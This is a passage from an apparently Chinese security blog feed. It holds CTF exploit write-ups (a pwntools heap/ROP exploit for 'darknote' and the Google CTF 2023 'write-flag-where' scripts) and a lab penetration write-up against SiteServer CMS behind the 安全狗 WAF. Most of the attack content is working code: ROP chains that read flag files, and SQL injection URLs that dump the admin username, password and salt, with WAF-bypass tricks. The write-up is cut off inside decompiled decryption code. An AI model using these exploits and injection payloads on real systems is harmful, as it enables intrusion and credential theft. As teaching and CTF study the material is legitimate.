<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./darknote&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./darknote&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./darknote&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Note: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;How many dark notes do you want?&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20010000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4db75</span>, flat(<span class="number">0</span>, <span class="number">0x71</span>, <span class="number">0x404240</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>, elf.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">libc_base = uu64() - <span class="number">0x10dfc0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">p_rsp_rbp_r = libc_base + <span class="number">0x000000000012cf7e</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4db75</span>, flat(<span class="number">0</span>, <span class="number">0x71</span>, <span class="number">0x404240</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>, libc_base + <span class="number">0x1ecbe0</span>))</span><br><span class="line">ru(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">heap_base = u64(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x370</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4db75</span>, flat(<span class="number">0</span>, <span class="number">0x71</span>, libc_base + <span class="number">0x1ed780</span> - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">add(<span class="number">0</span>, flat(heap_base + <span class="number">0x370</span>))</span><br><span class="line"></span><br><span class="line">pld = flat(</span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x8</span>,</span><br><span class="line">      heap_base,</span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span>,</span><br><span class="line">      heap_base + <span class="number">0x410</span>,        <span class="comment"># _wide_data</span></span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span>,</span><br><span class="line">      libc_base + <span class="number">0x1e8f60</span> - <span class="number">0x20</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line">pld = flat(</span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span>,</span><br><span class="line">      libc_base + <span class="number">0x54f20</span> + <span class="number">61</span>,</span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x30</span>,</span><br><span class="line">      heap_base + <span class="number">0x540</span>,</span><br><span class="line">      p_rdi_r + <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line">pld = flat(</span><br><span class="line">      <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span>,</span><br><span class="line">      heap_base + <span class="number">0x410</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line"></span><br><span class="line">pld = flat(</span><br><span class="line">      p_rdi_r, heap_base + <span class="number">0x600</span>,</span><br><span class="line">      p_rax_r, <span class="number">2</span>,</span><br><span class="line">      syscall_ret,</span><br><span class="line">      p_rsp_rbp_r, heap_base + <span class="number">0x5a8</span>, <span class="number">0</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line">pld = flat(</span><br><span class="line">      p_rdi_r, <span class="number">3</span>,</span><br><span class="line">      p_rsi_r, heap_base + <span class="number">0xb00</span>,</span><br><span class="line">      p_rdx_r, <span class="number">0x30</span>,</span><br><span class="line">      libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>],</span><br><span class="line">      p_rdi_r, heap_base + <span class="number">0xb00</span>,</span><br><span class="line">      libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">      <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line">add(<span class="number">0</span>, pld)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4db75</span>, flat(<span class="number">0</span>, <span class="number">0x71</span>, heap_base + <span class="number">0x670</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, flat(<span class="number">0</span>, <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>巅峰极客</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 Google CTF</title>
    <url>/2023/07/15/CTF/2023googlectf/</url>
    <content><![CDATA[<h2 id="write-flag-where"><a href="#write-flag-where" class="headerlink" title="write-flag-where"></a>write-flag-where</h2><p>首先读源码上碰到了一个难点，<code>dup2()</code>函数之前没碰到过，作用就是将前者的文件描述符复制到后者的文件描述符上，源码实现了将标准输出定位到1337这个文件描述符上，接着把标准输入、标准输出和标准错误都扔到了<code>/dev/null</code>中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read(v10, &amp;flag, <span class="number">0x80</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(v10);</span><br><span class="line">    v9 = dup2(<span class="number">1</span>, <span class="number">1337</span>);</span><br><span class="line">    v8 = open(<span class="string">&quot;/dev/null&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    dup2(v8, <span class="number">0</span>);</span><br><span class="line">    dup2(v8, <span class="number">1</span>);</span><br><span class="line">    dup2(v8, <span class="number">2</span>);</span><br><span class="line">    close(v8);</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br></pre></td></tr></table></figure>

<p>接着尝试运行程序发现没有回显，用 strace 进行跟踪，发现是超出了文件描述符的范围，用<code>ulimit</code>进行更改。</p>
<span id="more"></span>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strace ./chal</span><br><span class="line"></span><br><span class="line">ulimit -a</span><br><span class="line">ulimit -n 2048</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230710145033633.png" alt="image-20230710145033633"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230710145059186.png" alt="image-20230710145059186"></p>
<p><strong>还有一个问题，通过询问ex师傅，明白了为什么pwntools本地没法成功输入。因为pwntools本地采用的是管道通信，无法采取双向的传输，而pwntools的远程采用的是双向通信。</strong>这里采取patch的手法进行修正，结果如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230710152304342.png" alt="image-20230710152304342"></p>
<p>攻击思路就是通过输入固定格式的地址和长度，这样就可以将flag的值写入到原有的字符串中使得数据的泄露。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&quot;./chal_patch&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[-<span class="number">13</span>:-<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;leak_addr: &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;happily expire\n&#x27;</span>, <span class="built_in">hex</span>(leak_addr + <span class="number">0x21e0</span>) + <span class="string">&#x27; 60&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="write-flag-where2"><a href="#write-flag-where2" class="headerlink" title="write-flag-where2"></a>write-flag-where2</h2><p>对于<code>sscanf()</code>这个函数，如果成功匹配那么会返回匹配和赋值的个数，失败则会发生错误。我们可以利用这一性质，第一次将flag的值读入格式化参数中，第二次通过爆破来得到读入的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">table = <span class="string">&#x27;&#123;&#125;_?&#x27;</span> + string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">explode</span>(<span class="params"><span class="built_in">chr</span>, offset</span>):</span><br><span class="line">	sh = process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	leak_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[-<span class="number">13</span>:-<span class="number">1</span>].decode(), <span class="number">16</span>)</span><br><span class="line">	<span class="comment"># success(&#x27;leak_addr: &#x27; + hex(leak_addr))</span></span><br><span class="line"></span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">	sh.send(<span class="built_in">hex</span>(leak_addr + <span class="number">0x20bc</span> - offset) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	sh.send(<span class="built_in">chr</span> + <span class="built_in">hex</span>(leak_addr)[<span class="number">1</span>:] + <span class="string">&#x27; 60&#x27;</span>)</span><br><span class="line">	<span class="keyword">try</span> :</span><br><span class="line">		sh.recv(timeout = <span class="number">1</span>)</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">except</span> EOFError :</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">		<span class="keyword">if</span> explode(i, l):</span><br><span class="line">			flag += i</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span> + flag)</span><br><span class="line">			sleep(<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span> :</span><br><span class="line">			<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>



<h2 id="write-flag-where3"><a href="#write-flag-where3" class="headerlink" title="write-flag-where3"></a>write-flag-where3</h2><p>相较于上一题发现又多了限制，让我们只能去写libc上的地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(buf, <span class="string">&quot;0x%llx %u&quot;</span>, &amp;n[<span class="number">1</span>], n) != <span class="number">2</span> </span><br><span class="line">    || n[<span class="number">0</span>] &gt; <span class="number">0x7F</span>u </span><br><span class="line">    || *(_QWORD *)&amp;n[<span class="number">1</span>] &gt;= (<span class="type">unsigned</span> __int64)main - <span class="number">20480</span> &amp;&amp; (<span class="type">unsigned</span> __int64)main + <span class="number">20480</span> &gt;= *(_QWORD *)&amp;n[<span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学习一下团队的脚本。首先是修改<code>errno</code>相对于tls的偏移，errno是表示库函数所发生错误事件，是C库的一个宏，它会将错误码丢到tls的指定偏移处，而这个偏移是存在于libc上的，如下图所示，该题我们直接修改为0x43（也就是<code>C</code>）。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230711181404583.png" alt="image-20230711181404583"></p>
<p>然后是修改了close函数的调用号为0x43，这时候close就会发生错误，并将errno抛到tls指定的位置处，也就是偏移为0x43的地方。上网查了一下所抛出的errno的含义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Value of errno: 22</span><br><span class="line">Error opening file: Invalid argument</span><br></pre></td></tr></table></figure>

<p>之后就是修改write函数的汇编。首先第一次修改的是fs的索引值，修改为我们预设的，这样就能绕过<code>test eax, eax;</code>的检查实现跳转；其次第二次修改的是与rsp的偏移，使得我们能够控制edi的值，实现fd的改变，如下图所示：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230711182306977.png" alt="image-20230711182306977"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-7f&#x27;</span>, drop = <span class="literal">True</span>)[-<span class="number">12</span>:], <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_base + <span class="number">0x218e10</span>-<span class="number">0x70</span>, <span class="number">0x78</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_base + <span class="number">0x218e10</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>))		<span class="comment"># errno</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_base + <span class="number">0x115110</span>+<span class="number">1</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>))		<span class="comment"># close</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_base + <span class="number">0x114A28</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>))			<span class="comment"># write</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (libc_base + <span class="number">0x114A67</span>, <span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.send((&#x27;0x%lx %u\n&#x27; % (0, 0x70)).encode().ljust(0x13, b&#x27;\0&#x27;) + p32(1337))</span></span><br><span class="line">sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (<span class="number">0</span>, <span class="number">0x70</span>)).encode().ljust(<span class="number">0x13</span>, <span class="string">b&#x27;\0&#x27;</span>) + p32(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Google CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>初探有防护的内网域渗透</title>
    <url>/2023/07/15/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E4%B8%83/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学习的是暗月项目七：初探有防护的内网域渗透。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230715175540335.png" alt="image-20230715175540335"></p>
<ul>
<li>WEB服务器：学习了如何绕过安全狗进行目录扫描和SQL注入，同时尝试反编译和审计DLL，调用并修改其中的C#代码进行密文的破解，学会利用 msfvenom 制作 shellcode 免杀安全狗，最后利用 PrintSpoofer 进行服务器的提权。</li>
<li>OA办公系统：尝试了通达OA办公系统基本漏洞的探测和利用，免杀360全家桶，关闭防火墙实现端口得以被探测。</li>
<li>DC域控：尝试窃取域管理员的 token 进行票据传递的攻击。</li>
</ul>
<p>最终也是跟着暗月佬拿下了三台主机。</p>
<span id="more"></span>

<h2 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.0.0/24</span><br><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708132313932.png" alt="image-20230708132313932"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">masscan -p 1-65535 192.168.0.114 --rate=100			# 降低速率防止被封</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708133340114.png" alt="image-20230708133340114"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-s 设置扫描的间隔过安全狗</span></span><br><span class="line">dirsearch -u &quot;http://www.moonlab.com/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 1 -t 5</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708135450226.png" alt="image-20230708135450226"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708135718972.png" alt="image-20230708135718972"></p>
<p>最终找到了<code>/siteserver/login.aspx</code>目录，同时得到了 siteserver 版本、服务器和数据库的相关信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708142834757.png" alt="image-20230708142834757"></p>
<p>通过在 github 上搜索我们找到了相关的 poc，利用的是报错注入的攻击手段，截取了主要的部分如下所示。</p>
<blockquote>
<p><a href="https://github.com/qsdj/cncs-armory-ktrimisu/blob/d01419ed32d0e0e2f60fae5352dedc766f62a3a6/pocs/cms/SiteServer/SiteServer_0009.py#L31">cncs-armory-ktrimisu&#x2F;pocs&#x2F;cms&#x2F;SiteServer&#x2F;SiteServer_0009.py(github.com)</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ps = [<span class="string">&#x27;/siteserver/service/background_taskLog.aspx?Keyword=test%%27%20and%20convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version))=1%20and%202=%271&amp;DateFrom=&amp;DateTo=&amp;IsSuccess=All&#x27;</span>, </span><br><span class="line">      <span class="string">&#x27;/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNameCollection=test%27)%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=2;%20--&#x27;</span>, </span><br><span class="line">      <span class="string">&#x27;/siteserver/bbs/background_keywordsFilting.aspx?grade=0&amp;categoryid=0&amp;keyword=test%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%202=%271&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;/siteserver/userRole/background_administrator.aspx?RoleName=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%271&amp;PageNum=0&amp;Keyword=test&amp;AreaID=0&amp;LastActivityDate=0&amp;Order=UserName&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;/siteserver/userRole/background_user.aspx?PageNum=0&amp;Keyword=%27%20and%20char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version=1%20and%201=%27&amp;CreateDate=0&amp;LastActivityDate=0&amp;TypeID=0&amp;DepartmentID=0&amp;AreaID=0&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;/siteserver/bbs/background_thread.aspx?UserName=test&amp;Title=%27%20and%201=char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73)%2B@@version%20and%201=%27&amp;DateFrom=&amp;DateTo=&amp;ForumID=0&#x27;</span>,</span><br><span class="line">     ]</span><br></pre></td></tr></table></figure>

<p>选取第一个进行测试，发现被安全狗提醒有不合法的参数，猜测是过滤了某些字符。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708201749357.png" alt="image-20230708201749357"></p>
<p>这里采用一些绕过加密狗的方式，搜集到的有内联注释、空字符截断、~位操作截断，尝试下来用空字符截断就可以解决。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708202334091.png" alt="image-20230708202334091"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708202411494.png" alt="image-20230708202411494"></p>
<p>但选择第二个 payload 就能够成功绕过狗成功报错注入。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708204920738.png" alt="image-20230708204920738"></p>
<p>同时，采用取反的操作我们可以获得数据库名。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230708205435089.png" alt="image-20230708205435089"></p>
<p>通过搜索引擎，我们发现了 siteserver 数据库的结构，尤其是找到了管理员表<code>siteserver_Administrator</code>，如下所示。</p>
<blockquote>
<p><a href="https://jingyan.baidu.com/article/4b07be3c85f39a48b380f3e8.html">图解SiteServer CMS 数据结构说明-百度经验 (baidu.com)</a></p>
</blockquote>
<p><img src="https://exp-picture.cdn.bcebos.com/bbf95c406afec314585eda58cac1b727ad539c31.jpg?x-bce-process=image/format,f_auto/quality,q_80"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNa</span><br><span class="line">meCollection=test%27)%20and%20~1=(select%20top%201%20username%20from%</span><br><span class="line">20[bairong_Administrator]);%20--</span><br><span class="line"></span><br><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNa</span><br><span class="line">meCollection=test%27)%20and%20~1=(select%20top%201%20password%20from%</span><br><span class="line">20[bairong_Administrator]);%20--</span><br><span class="line"></span><br><span class="line">http://www.moonlab.com/usercenter/platform/user.aspx?UnLock=sdfe%27&amp;UserNa</span><br><span class="line">meCollection=test%27)%20and%20~1=(select%20top%201%20PasswordSalt%20fro</span><br><span class="line">m%20[bairong_Administrator]);%20--</span><br></pre></td></tr></table></figure>

<p><strong>注意的是，需要加入 top 关键字来限制记录的数量，否则会查询失败；其次需要使用中括号对表名进行包含，否则绕不过安全狗。</strong>最终查询到以下的结果：</p>
<ul>
<li>管理员账号：admin</li>
<li>管理员密码：64Cic1ERUP9n2OzxuKl9Tw&#x3D;&#x3D;</li>
<li>密码加密格式：Encrypted</li>
<li>密钥：LIywB&#x2F;zHFDTuEA1LU53Opg&#x3D;&#x3D;</li>
</ul>
<p>通过代码审计，找到相关的加密算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- /siteserver/login.aspx --&gt;</span><br><span class="line">&lt;%@ Page Language=&quot;c#&quot; Inherits=&quot;BaiRong.BackgroundPages.FrameworkLogin&quot; %&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000281 RID: 641 RVA: 0x000084F0 File Offset: 0x000068F0</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">DecodePassword</span>(<span class="params"><span class="built_in">string</span> password, EPasswordFormat passwordFormat, <span class="built_in">string</span> passwordSalt</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> text = <span class="built_in">string</span>.Empty;</span><br><span class="line">    <span class="built_in">bool</span> flag2;</span><br><span class="line">    <span class="built_in">bool</span> flag = (flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) + (flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) &gt; <span class="built_in">uint</span>.MaxValue;</span><br><span class="line">    DESEncryptor desencryptor;</span><br><span class="line">    <span class="built_in">string</span> result;</span><br><span class="line">    <span class="keyword">if</span> (!flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (((flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) | <span class="number">2U</span>) != <span class="number">0U</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                flag2 = (passwordFormat != EPasswordFormat.Clear);</span><br><span class="line">                <span class="keyword">if</span> (!flag2)</span><br><span class="line">                &#123;</span><br><span class="line">                    text = password;</span><br><span class="line">                    <span class="keyword">if</span> (((flag2 ? <span class="number">1U</span> : <span class="number">0U</span>) &amp; <span class="number">0U</span>) == <span class="number">0U</span>)</span><br><span 